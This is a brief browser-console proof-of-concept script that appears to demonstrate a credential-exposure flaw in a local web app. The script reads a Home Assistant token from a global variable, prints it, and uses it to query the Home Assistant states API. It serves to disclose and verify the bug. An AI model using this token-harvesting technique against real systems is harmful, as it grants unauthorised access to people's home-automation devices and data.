// Token Extraction PoC
// Run this in browser console when http://localhost:8080 is open

(function() {
    console.log('=== Token Exposure PoC ===');
    
    // Check if token is exposed
    if (typeof __HA_TOKEN__ !== 'undefined') {
        console.log('Token found:', __HA_TOKEN__);
        console.log('Token length:', __HA_TOKEN__.length, 'characters');
        
        // Attempt to use token
        const HA_URL = typeof __HA_BASE_URL__ !== 'undefined' 
            ? __HA_BASE_URL__ 
            : 'http://192.168.1.100:8123';
        
        console.log('Home Assistant URL:', HA_URL);
        console.log('\nTesting API access...');
        
        fetch(`${HA_URL}/api/states`, {
            headers: {
                'Authorization': `Bearer ${__HA_TOKEN__}`
            }
        })
        .then(res => {
            if (res.ok) {
                console.log('API access successful!');
                return res.json();
            } else {
                console.log('API request failed:', res.status);
            }
        })
        .then(data => {
            if (data) {
                console.log(`Retrieved ${data.length} entities`);
                console.log('Sample entities:', data.slice(0, 3));
            }
        })
        .catch(err => {
            console.error('Network error:', err);
        });
        
    } else {
        console.log('Token not found (application is secure)');
    }
})();
